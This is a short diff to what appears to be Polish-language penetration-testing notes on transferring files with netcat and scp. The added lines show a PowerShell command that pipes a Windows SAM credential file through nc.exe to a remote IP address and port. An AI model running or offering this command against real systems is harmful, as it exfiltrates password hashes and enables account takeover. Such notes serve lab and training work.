@@ -43,7 +43,10 @@ nc -nlvp 9999 > dane
 ```console
 nc -n <ip> 9999 < file
 ```
-
+### Wyslanie pliku z windowsa
+```console
+Get-Content SAM.base | .\nc.exe 10.10.116.147 9001
+```
 
 # Przeslanie przez ssh scp
 ### Przeslanie
